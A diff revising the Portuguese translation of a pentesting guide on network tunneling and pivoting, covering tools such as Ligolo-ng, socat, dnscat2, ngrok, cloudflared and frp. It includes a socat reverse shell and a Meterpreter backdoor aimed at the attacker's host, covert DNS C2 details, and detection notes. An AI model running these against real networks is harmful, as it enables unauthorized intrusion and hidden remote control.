-> O projeto original alerta para não tratar o certificado autoassinado incorporado como proteção de privacidade. Prefira um certificado personalizado válido e `--tls-verify-certificate` (ou mTLS), mantenha os listeners do proxy em loopback, a menos que o acesso remoto seja intencional, e use o túnel para protocolos já seguros quando a confidencialidade for importante.<sup>[[52]](#references)</sup>
+> O projeto upstream recomenda não tratar o certificado autoassinado incorporado como proteção de privacidade. Prefira um certificado personalizado válido com `--tls-verify-certificate` (ou mTLS), mantenha os listeners do proxy em loopback, a menos que o acesso remoto seja intencional, e tunelize protocolos já seguros quando a confidencialidade for importante.<sup>[[52]](#references)</sup>
 
 ## Ligolo-ng
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-O guia de início rápido do Ligolo-ng documenta uma interface TUN no proxy, a validação da impressão digital do certificado do agent e a configuração de rotas para a rede tunelada.<sup>[[17]](#references)</sup>
+O guia de início rápido do Ligolo-ng documenta uma interface TUN no proxy, a validação da impressão digital do certificado do agent e a configuração de rotas para a rede tunelizada.<sup>[[17]](#references)</sup>
 
-### Tunelamento
+### Tunneling
 
 ```bash
 # Start proxy server and automatically generate self-signed TLS certificates -- Attacker
@@ -394,9 +411,9 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 interface_list
 ```
 
-### Vinculação e escuta do Agent
+### Vinculação e escuta do agente
 
-O Ligolo-ng pode adicionar listeners no agent que encaminham para um endereço no lado do proxy, e seu intervalo reservado `240.0.0.0/4` pode ser roteado para acessar serviços locais do agent.<sup>[[18]](#references)[[19]](#references)</sup>
+O Ligolo-ng pode adicionar listeners no agente que encaminham para um endereço do lado do proxy, e seu intervalo reservado `240.0.0.0/4` pode ser roteado para alcançar serviços locais do agente.<sup>[[18]](#references)[[19]](#references)</sup>
 
 ```bash
 # Establish a tunnel from the proxy server to the agent
@@ -406,7 +423,7 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 listener_list
 ```
 
-### Acessar as portas locais do agente
+### Acessar as portas locais do Agent
 
 ```bash
 # Establish a tunnel from the proxy server to the agent
@@ -418,7 +435,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Rpivot inicia o túnel reverso a partir da vítima e expõe um proxy SOCKS4 no endereço de loopback do atacante; seu README também documenta credenciais de proxy NTLM e opções de hash.<sup>[[20]](#references)</sup>
+O Rpivot inicia o túnel reverso a partir da vítima e expõe um proxy SOCKS4 no endereço de loopback do atacante; o README também documenta credenciais de proxy NTLM e opções de hash.<sup>[[20]](#references)</sup>
 
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -428,7 +445,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
 
-Pivot via **NTLM proxy**
+Faça pivot através de **NTLM proxy**
 
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
@@ -464,13 +481,13 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
 
-### Port2Port através de socks
+### Port2Port por meio de socks
 
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
 
-### Meterpreter por meio de SSL Socat
+### Meterpreter via SSL Socat
 
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
@@ -482,7 +499,7 @@ victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server
 #Execute the meterpreter
 ```
 
-Você pode atravessar um **proxy não autenticado** com o tipo de endereço `PROXY` documentado do socat, executando esta linha em vez da última no console da vítima.<sup>[[21]](#references)</sup>
+Você pode atravessar um **proxy sem autenticação** com o tipo de endereço `PROXY` documentado do socat, executando esta linha em vez da última no console da vítima.<sup>[[21]](#references)</sup>
 
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
@@ -490,9 +507,9 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### Túnel SSL do Socat
+### Túnel Socat SSL
 
-**/bin/sh console**
+**console /bin/sh**
 
 Crie certificados em ambos os lados: Cliente e Servidor
 
@@ -512,7 +529,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 
 ### Remote Port2Port
 
-Conecte a porta SSH local (22) à porta 443 do host do atacante
+Conecte a porta SSH local (22) à porta 443 do host do atacante.
 
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
@@ -524,7 +541,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Plink é a ferramenta de conexão por linha de comando do PuTTY, com opções de encaminhamento SSH semelhantes às do `ssh`.<sup>[[22]](#references)</sup>
 
-Use `-P` maiúsculo para a porta SSH. `-pw` é mantido por compatibilidade, mas expõe a senha na lista de processos; prefira a autenticação por chave ou `-pwfile` quando possível.<sup>[[22]](#references)[[23]](#references)</sup>
+Use `-P` maiúsculo para a porta SSH. `-pw` é mantido por compatibilidade, mas expõe a senha na lista de processos; prefira autenticação por chave ou `-pwfile` quando possível.<sup>[[22]](#references)[[23]](#references)</sup>
 
 Como esse binário será executado na vítima e é um cliente SSH, abra o serviço e a porta SSH para a conexão reversa; o exemplo a seguir usa `-R` para encaminhar uma porta acessível localmente para a máquina do atacante.<sup>[[22]](#references)</sup>
 
@@ -537,7 +554,7 @@ echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-Use um contexto com as permissões exigidas pelo host ao criar ou alterar regras persistentes de `portproxy`. A Microsoft documenta os formatos `v4tov4` de adição, exibição e exclusão usados abaixo.<sup>[[24]](#references)</sup>
+Use um contexto com as permissões exigidas pelo host ao criar ou alterar regras persistentes de `portproxy`. A Microsoft documenta as formas `v4tov4` de adicionar, exibir e excluir usadas abaixo.<sup>[[24]](#references)</sup>
 
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
@@ -551,35 +568,35 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 
 ### Implantando `portproxy` por meio de uma tarefa agendada
 
-Quando há credenciais administrativas disponíveis, a execução remota do Agendador de Tarefas pode instalar uma regra de encaminhamento nativa sem enviar um relay dedicado. Por exemplo, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) pode fazer um pivot escutar na porta TCP/443 e encaminhar a conexão para um serviço SMB interno.<sup>[[57]](#references)[[58]](#references)</sup>
+Quando há credenciais administrativas disponíveis, a execução remota do Task Scheduler pode instalar uma regra nativa de encaminhamento sem fazer upload de um relay dedicado. Por exemplo, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) pode fazer um pivot escutar na porta TCP/443 e retransmitir a conexão para um serviço SMB interno.<sup>[[57]](#references)[[58]](#references)</sup>
 
 ```bash
 atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
   'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
 ```
 
-A regra é persistente, então liste-a com `netsh interface portproxy show v4tov4` e remova-a explicitamente após os testes. Lembre-se de que `portproxy` apenas encaminha conexões; o firewall do host também precisa permitir a porta de escuta.<sup>[[24]](#references)</sup>
+A regra é persistente, então liste-a com `netsh interface portproxy show v4tov4` e remova-a explicitamente após os testes. Lembre-se de que `portproxy` fornece apenas encaminhamento; o firewall do host também precisa permitir a porta de escuta.<sup>[[24]](#references)</sup>
 
 ## SocksOverRDP & Proxifier
 
 Você precisa ter **acesso ao sistema via RDP**.\
 Baixe:
 
-SocksOverRDP usa Remote Desktop Dynamic Virtual Channels para transportar uma conexão SOCKS5 por uma sessão RDP existente; o plugin do cliente escuta em `127.0.0.1:1080`, enquanto o componente do servidor é executado no destino RDP.<sup>[[25]](#references)</sup>
+O SocksOverRDP usa canais virtuais dinâmicos do Remote Desktop para transportar uma conexão SOCKS5 por uma sessão RDP existente; o plugin do cliente escuta em `127.0.0.1:1080`, enquanto o componente do servidor é executado no alvo RDP.<sup>[[25]](#references)</sup>
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso Remote Desktop Service do Windows. O DVC é responsável por **encapsular pacotes na conexão RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Essa ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso Remote Desktop Service do Windows. O DVC é responsável por **tunelar pacotes pela conexão RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-No computador cliente, carregue **`SocksOverRDP-Plugin.dll`** desta forma:
+No computador cliente, carregue **`SocksOverRDP-Plugin.dll`** assim:
 
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 
-Agora podemos **nos conectar** à **vítima** via **RDP** usando **`mstsc.exe`**. Deveremos receber uma **mensagem** informando que o **plugin SocksOverRDP está habilitado** e que ele **escutará** em **127.0.0.1:1080**.
+Agora podemos **conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **prompt** informando que o **plugin SocksOverRDP está habilitado** e que ele vai **escutar** em **127.0.0.1:1080**.
 
-**Conecte-se** via **RDP** e faça upload e execute o binário `SocksOverRDP-Server.exe` na máquina da vítima:
+**Conecte-se** via **RDP** e faça upload do binário `SocksOverRDP-Server.exe` para a máquina da vítima e execute-o:
 
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
@@ -591,21 +608,21 @@ Agora, confirme na sua máquina (atacante) que a porta 1080 está em escuta:
 netstat -antb | findstr 1080
 ```
 
-Agora você pode usar [**Proxifier**](https://www.proxifier.com/) para encaminhar o tráfego por essa porta.<sup>[[26]](#references)</sup>
+Agora você pode usar [**Proxifier**](https://www.proxifier.com/) para encaminhar o tráfego pelo port.<sup>[[26]](#references)</sup>
 
-### Caça a canais virtuais RDP
+### Caça a canais virtuais de RDP
 
-[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) é outro túnel de canal virtual RDP; o nome de canal padrão é `rdp2tcp`, embora um operador possa selecionar um nome diferente.<sup>[[56]](#references)</sup> A criação e o fechamento de canais são registrados em `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` como IDs de evento **132** e **148**. Procure por `rdp2tcp` e nomes de canais raros/aleatórios e compare-os com canais esperados, como `XPSRD`, `cliprdr` e `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>
+[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) é outro túnel de canal virtual de RDP; o nome padrão do canal é `rdp2tcp`, embora um operador possa escolher outro nome.<sup>[[56]](#references)</sup> A criação e o encerramento de canais são registrados em `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` com os IDs de evento **132** e **148**. Procure por `rdp2tcp` e nomes de canais raros/aleatórios e, em seguida, compare-os com canais esperados, como `XPSRD`, `cliprdr` e `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>
 
-## Proxificar aplicativos GUI do Windows
+## Encaminhar aplicativos GUI do Windows por proxy
 
-Você pode fazer aplicativos GUI do Windows navegarem por um proxy usando [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
+Você pode fazer com que aplicativos GUI do Windows naveguem por um proxy usando [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
 Em **Profile -> Proxy Servers**, adicione o IP e a porta do servidor SOCKS.\
-Em **Profile -> Proxification Rules**, adicione o nome do programa a ser proxificado e as conexões aos IPs que você deseja proxificar; as regras do Proxifier podem corresponder a aplicativos, hosts de destino e portas.<sup>[[27]](#references)</sup>
+Em **Profile -> Proxification Rules**, adicione o nome do programa a ser encaminhado por proxy e as conexões com os IPs que deseja encaminhar por proxy; as regras do Proxifier podem corresponder a aplicativos, hosts de destino e portas.<sup>[[27]](#references)</sup>
 
-## Tunelar por um proxy NTLM
+## Criar um túnel por meio de um proxy NTLM
 
-A ferramenta mencionada anteriormente, **Rpivot**, pode encaminhar tráfego por um proxy que autentica com NTLM. **OpenVPN** também pode rotear tráfego por um proxy desse tipo quando configurado com um arquivo de autenticação e o método NTLMv2; isso é travessia de proxy, não um bypass da autenticação do proxy.<sup>[[20]](#references)[[28]](#references)</sup>
+A ferramenta mencionada anteriormente, **Rpivot**, pode retransmitir conexões por meio de um proxy com autenticação NTLM. O **OpenVPN** também pode rotear conexões por meio de um proxy desse tipo quando configurado com um arquivo de autenticação e o método NTLMv2; isso é uma travessia de proxy, não um bypass da autenticação do proxy.<sup>[[20]](#references)[[28]](#references)</sup>
 
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
@@ -615,8 +632,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-O Cntlm autentica-se em proxies NTLM upstream, expõe listeners locais e pode mapear uma porta local do túnel para um serviço de destino; os clientes podem então usar essa porta local.<sup>[[29]](#references)</sup>\
-Por exemplo, encaminhar a porta 443
+O Cntlm autentica-se em proxies NTLM upstream, expõe listeners locais e pode mapear uma porta de túnel local para um serviço de destino; os clientes podem então usar essa porta local.<sup>[[29]](#references)</sup>\
+Por exemplo, encaminhar essa porta 443
 
 ```
 Username Alice
@@ -626,7 +643,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 
-Agora, se você configurar, por exemplo, o serviço **SSH** na vítima para escutar na porta 443, poderá se conectar a ele pela porta 2222 do atacante.<sup>[[29]](#references)</sup>\
+Agora, se você configurar, por exemplo, o serviço **SSH** da vítima para escutar na porta 443, poderá se conectar a ele pela porta 2222 do atacante.<sup>[[29]](#references)</sup>\
 Você também pode usar um **meterpreter** que se conecta a localhost:443 enquanto o atacante escuta na porta 2222.<sup>[[29]](#references)</sup>
 
 ## YARP
@@ -639,7 +656,7 @@ YARP (Yet Another Reverse Proxy) é o toolkit de proxy reverso .NET da Microsoft
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-O Iodine cria um túnel IPv4 por meio de consultas DNS e usa interfaces TUN; a configuração documentada exige os privilégios necessários para criar essas interfaces nas duas extremidades.<sup>[[31]](#references)</sup>
+O Iodine cria um túnel IPv4 por meio de consultas DNS e usa interfaces TUN; a configuração documentada exige os privilégios necessários para criar essas interfaces em ambas as extremidades.<sup>[[31]](#references)</sup>
 
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
@@ -647,7 +664,7 @@ victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
 
-O transporte DNS tem um overhead maior do que o TCP direto e costuma ser lento; você pode criar uma conexão SSH compactada por meio deste túnel usando:<sup>[[31]](#references)</sup>
+O transporte DNS tem mais sobrecarga do que o TCP direto e geralmente é lento; você pode criar uma conexão SSH compactada por meio deste túnel usando:<sup>[[31]](#references)</sup>
 
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
@@ -655,9 +672,9 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 ### DNSCat2
 
-[**Baixe-o aqui**](https://github.com/iagox86/dnscat2)**.**
+[**Baixe aqui**](https://github.com/iagox86/dnscat2)**.**
 
-Dnscat2 estabelece um canal criptografado de command-and-control por meio de DNS; os comandos de servidor e cliente abaixo seguem o uso documentado.<sup>[[32]](#references)</sup>
+O Dnscat2 estabelece um canal criptografado de command-and-control por meio de DNS; os comandos do servidor e do cliente abaixo seguem o uso documentado da ferramenta.<sup>[[32]](#references)</sup>
 
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
@@ -677,7 +694,7 @@ Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
 
-#### **Encaminhamento de portas com dnscat**
+#### **Port forwarding com dnscat**
 
 O comando interativo `listen` do dnscat2 mapeia um listener local para um host e uma porta remotos.<sup>[[32]](#references)</sup>
 
@@ -688,19 +705,19 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 
 #### Alterar o DNS do proxychains
 
-Proxychains-ng intercepta conexões TCP vinculadas dinamicamente e não pode transportar UDP ou ICMP; o proxy de DNS é configurável, portanto, inspecione o `proxychains.conf` instalado e o helper do resolver em vez de presumir que há um resolver público fixo. Scripts legados `proxyresolv` disponibilizam `PROXY_DNS_SERVER` para escolher o resolver; use um resolver acessível a partir do pivot quando forem necessários nomes internos.<sup>[[34]](#references)[[35]](#references)</sup>
+O Proxychains-ng intercepta conexões TCP vinculadas dinamicamente e não pode transportar UDP nem ICMP; o proxy de DNS é configurável, portanto, inspecione o `proxychains.conf` instalado e o helper do resolver em vez de presumir um resolver público fixo. Scripts legados `proxyresolv` disponibilizam `PROXY_DNS_SERVER` para escolher o resolver; use um resolver acessível a partir do pivot quando forem necessários nomes internos.<sup>[[34]](#references)[[35]](#references)</sup>
 
 ## Túneis em Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-### C2 personalizado via DNS TXT / HTTP JSON (AK47C2)
+### TXT DNS personalizado / C2 JSON HTTP (AK47C2)
 
-O ator Storm-2603 criou um **C2 de canal duplo ("AK47C2")** que abusa *somente* do tráfego de saída **DNS** e **HTTP POST simples** — dois protocolos que raramente são bloqueados em redes corporativas.<sup>[[2]](#references)</sup>
+O ator Storm-2603 criou um **C2 de canal duplo ("AK47C2")** que abusa *somente* do tráfego de saída **DNS** e **HTTP POST sem criptografia** — dois protocolos raramente bloqueados em redes corporativas.<sup>[[2]](#references)</sup>
 
 1. **Modo DNS (AK47DNS)**
    • Gera um SessionID aleatório de 5 caracteres (por exemplo, `H4T14`).  
-   • Adiciona `1` no início para *solicitações de tarefas* ou `2` para *resultados* e concatena diferentes campos (flags, SessionID, nome do computador).  
+   • Acrescenta `1` para *solicitações de tarefas* ou `2` para *resultados* e concatena campos diferentes (flags, SessionID, nome do computador).  
    • Cada campo é **criptografado com XOR usando a chave ASCII `VHBD@H`**, codificado em hexadecimal e unido com pontos — terminando, por fim, com o domínio controlado pelo atacante:
 
    ```text
@@ -716,16 +733,16 @@ O ator Storm-2603 criou um **C2 de canal duplo ("AK47C2")** que abusa *somente* 
    ```json
    {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
    ```
-   • O blob inteiro é XOR-`VHBD@H` → hex → enviado como corpo de um **`POST /`** com o cabeçalho `Content-Type: text/plain`.
-   • A resposta segue a mesma codificação e o campo `cmd` é executado com `cmd.exe /c <command> 2>&1`.
+   • O blob inteiro é submetido a XOR com `VHBD@H` → convertido para hexadecimal → enviado no corpo de um **`POST /`** com o cabeçalho `Content-Type: text/plain`.
+   • A resposta segue a mesma codificação, e o campo `cmd` é executado com `cmd.exe /c <command> 2>&1`.
 
 Notas do Blue Team
-• Procure consultas **TXT** incomuns cujo primeiro rótulo seja um hexadecimal longo e que sempre terminem em um domínio raro.
-• Uma chave XOR constante seguida de ASCII-hex é fácil de detectar com YARA: `6?56484244?484` (`VHBD@H` em hex).
-• Para HTTP, sinalize corpos de requisições POST com `text/plain` que sejam compostos apenas por hex e tenham um número par de bytes.
+• Procure queries **TXT** incomuns cujo primeiro rótulo seja uma longa sequência hexadecimal e que sempre terminem no mesmo domínio raro.  
+• Uma chave XOR constante seguida de hexadecimal ASCII é fácil de detectar com YARA: `6?56484244?484` (hexadecimal de `VHBD@H`).  
+• Para HTTP, sinalize corpos de POST `text/plain` que contenham somente hexadecimal e tenham comprimento múltiplo de dois bytes.
 
 {{#note}}
-O canal mantém cada rótulo de subdomínio dentro do limite de 63 octetos do DNS, mas a conformidade com o protocolo, por si só, não o torna furtivo; domínios raros, rótulos hexadecimais longos e o volume de consultas continuam sendo sinais de detecção.<sup>[[2]](#references)[[36]](#references)</sup>
+O canal mantém cada rótulo de subdomínio dentro do limite DNS de 63 octetos, mas a conformidade com o protocolo, por si só, não o torna furtivo; domínios raros, rótulos hexadecimais longos e volume de queries continuam sendo sinais de detecção.<sup>[[2]](#references)[[36]](#references)</sup>
 {{#endnote}}
 
 ## ICMP Tunneling
@@ -735,7 +752,7 @@ O canal mantém cada rótulo de subdomínio dentro do limite de 63 octetos do DN
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Hans documenta um túnel IPv4 sobre ICMP usando um dispositivo TUN e solicitações de eco ICMP; a configuração exige privilégios suficientes para criar a interface.<sup>[[37]](#references)</sup>
+Hans documenta um túnel IPv4 sobre ICMP que usa um dispositivo TUN e solicitações de eco ICMP; a configuração exige privilégios suficientes para criar a interface.<sup>[[37]](#references)</sup>
 
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
@@ -765,7 +782,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) é um agente que disponibiliza serviços de rede locais online por meio de um túnel seguro; a CLI documenta endpoints HTTP, TCP e de URL de arquivo, e o hostname do endpoint exibido pode variar conforme o endpoint e a conta.<sup>[[39]](#references)</sup>
+[**ngrok**](https://ngrok.com/) é um agente para disponibilizar serviços de rede locais online por meio de um túnel seguro; sua CLI documenta endpoints HTTP, TCP e de URL de arquivo, e o hostname do endpoint exibido pode variar conforme o endpoint e a conta.<sup>[[39]](#references)</sup>
 
 ### Instalação
 
@@ -783,7 +800,7 @@ chmod a+x ./ngrok
 
 **Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_O agent também oferece suporte a opções de autenticação e TLS quando necessário.<sup>[[39]](#references)</sup>_
+_O agente também oferece suporte a opções de autenticação e TLS quando necessário.<sup>[[39]](#references)</sup>_
 
 #### Tunelamento TCP
 
@@ -805,11 +822,11 @@ _O agent também oferece suporte a opções de autenticação e TLS quando neces
 #### Sniffing de chamadas HTTP
 
 _Útil para XSS,SSRF,SSTI ..._\
-O agente standalone expõe sua interface de inspeção HTTP em `http://127.0.0.1:4040` por padrão; a interface é para tráfego HTTP.<sup>[[40]](#references)</sup>
+Por padrão, o agente autônomo expõe sua interface de inspeção HTTP em `http://127.0.0.1:4040`; a interface é para tráfego HTTP.<sup>[[40]](#references)</sup>
 
-#### Tunneling de serviço HTTP interno
+#### Tunelamento de serviço HTTP interno
 
-A opção `--host-header=rewrite` reescreve o cabeçalho HTTP `Host` upstream para corresponder ao serviço local.<sup>[[41]](#references)</sup>
+A opção `--host-header=rewrite` reescreve o cabeçalho `Host` HTTP upstream para corresponder ao serviço local.<sup>[[41]](#references)</sup>
 
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
@@ -818,7 +835,7 @@ A opção `--host-header=rewrite` reescreve o cabeçalho HTTP `Host` upstream pa
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
 
-#### Exemplo de configuração simples do ngrok.yaml
+#### exemplo de configuração simples do ngrok.yaml
 
 Isso usa o ngrok Agent Config v2; túneis nomeados usam `proto` e `addr` e são iniciados com `ngrok start`.<sup>[[42]](#references)</sup> Ele abre 3 túneis:
 
@@ -841,7 +858,7 @@ tunnels:
 
 ## Microsoft Dev Tunnels
 
-O Microsoft Dev Tunnels pode publicar um serviço local baseado em TCP por meio da infraestrutura de retransmissão da Microsoft. A CLI do host cria um túnel de saída, enquanto `devtunnel connect` recria a porta hospedada no cliente; por padrão, os túneis exigem autenticação, a menos que os controles de acesso sejam deliberadamente flexibilizados.<sup>[[55]](#references)[[58]](#references)</sup>
+O Microsoft Dev Tunnels pode publicar um serviço local baseado em TCP por meio da infraestrutura de relay da Microsoft. O CLI do host cria um túnel de saída, enquanto `devtunnel connect` recria a porta hospedada no cliente; por padrão, os túneis exigem autenticação, a menos que os controles de acesso sejam deliberadamente flexibilizados.<sup>[[55]](#references)[[58]](#references)</sup>
 
 ```bash
 # Compromised/pivot host: publish its local RDP service
@@ -854,13 +871,13 @@ devtunnel connect <TUNNEL_ID>
 xfreerdp /u:<USER> /v:127.0.0.1:3389
 ```
 
-Isso pode expor RDP por meio de `*.devtunnels.ms` sem abrir um novo listener de entrada no perímetro. Também pode ser combinado com um túnel de canal virtual RDP, como `rdp2tcp`, transformando a sessão RDP em um pivot de segunda etapa para tráfego TCP arbitrário.<sup>[[58]](#references)</sup>
+Isso pode expor RDP por meio de `*.devtunnels.ms` sem abrir um novo listener de entrada no perímetro. Também pode ser combinado com um túnel de canal virtual RDP, como `rdp2tcp`, transformando a sessão RDP em um pivot de segundo estágio para tráfego TCP arbitrário.<sup>[[58]](#references)</sup>
 
-Para hunting, correlacione a execução da CLI do Dev Tunnels com tráfego DNS/TLS para `*.devtunnels.ms` e eventos inesperados de canal virtual RDP. Um túnel autenticado não é benigno apenas porque usa um relay de propriedade da Microsoft.<sup>[[58]](#references)</sup>
+Para threat hunting, correlacione a execução da CLI do Dev Tunnels com tráfego DNS/TLS para `*.devtunnels.ms` e eventos inesperados de canal virtual RDP. Um túnel autenticado não é benigno só porque usa um relay de propriedade da Microsoft.<sup>[[58]](#references)</sup>
 
 ## Cloudflared (Cloudflare Tunnel)
 
-O conector `cloudflared` do Cloudflare Tunnel estabelece conexões de saída; aplicativos publicados podem rotear HTTP, HTTPS, TCP, SSH e RDP, enquanto os quick tunnels são destinados ao desenvolvimento HTTP.<sup>[[43]](#references)[[45]](#references)</sup>
+O conector `cloudflared` do Cloudflare Tunnel estabelece conexões de saída; aplicações publicadas podem encaminhar HTTP, HTTPS, TCP, SSH e RDP, enquanto os quick tunnels são destinados ao desenvolvimento HTTP.<sup>[[43]](#references)[[45]](#references)</sup>
 
 ### One-liner de quick tunnel
 
@@ -881,7 +898,7 @@ cloudflared tunnel --url socks5://localhost:1080 --socks5
 
 ### Túneis persistentes com DNS
 
-A configuração de túnel gerenciada localmente usa as chaves `tunnel`, `credentials-file` e `url` em letras minúsculas, conforme mostrado abaixo.<sup>[[46]](#references)</sup>
+A configuração de túnel gerenciada localmente usa as chaves em letras minúsculas `tunnel`, `credentials-file` e `url`, conforme mostrado abaixo.<sup>[[46]](#references)</sup>
 
 ```bash
 cloudflared tunnel create mytunnel
@@ -898,11 +915,11 @@ Inicie o conector:
 cloudflared tunnel run mytunnel
 ```
 
-O conector estabelece conexões de saída e, por padrão, negocia QUIC com fallback para HTTP/2; não presuma que todas as implantações usem TCP/443. Execute-o apenas com os privilégios necessários para sua implantação.<sup>[[43]](#references)[[47]](#references)</sup>
+O conector estabelece conexões de saída e, por padrão, negocia QUIC com fallback para HTTP/2; não presuma que todas as implantações usam TCP/443. Execute-o apenas com os privilégios exigidos pela sua implantação.<sup>[[43]](#references)[[47]](#references)</sup>
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que oferece suporte a **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX e XTCP**. O XTCP usa perfuração P2P, cujo sucesso depende do NAT. A partir da **v0.53.0**, ele pode atuar como um **gateway SSH Tunnel**, permitindo que um host de destino use o cliente OpenSSH padrão sem um binário `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>
+[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que oferece suporte a **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX e XTCP**. O XTCP usa perfuração P2P, cujo sucesso depende do NAT. A partir da versão **v0.53.0**, ele pode atuar como um **SSH Tunnel Gateway**, permitindo que um host de destino use o cliente OpenSSH padrão sem um binário `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>
 
 ### Túnel TCP reverso clássico
 
@@ -940,15 +957,15 @@ O comando acima publica a porta **8080** da vítima como **attacker_ip:9000** us
 
 ## Back-connects UDP assistidos por STUN
 
-Solicitações STUN Binding enviadas por um socket UDP podem revelar seu endereço IP e porta reflexivos do servidor, enquanto o tráfego periódico mantém o binding do NAT ativo. Um servidor STUN público não funciona como relay para pacotes de controle arbitrários.<sup>[[60]](#references)</sup> Um design de back-connect analisado manteve o mesmo socket UDP para um datagrama de controle curto e, em seguida, usou uma *conexão TCP de saída separada* para buscar e executar comandos após a chegada do trigger.<sup>[[59]](#references)</sup>
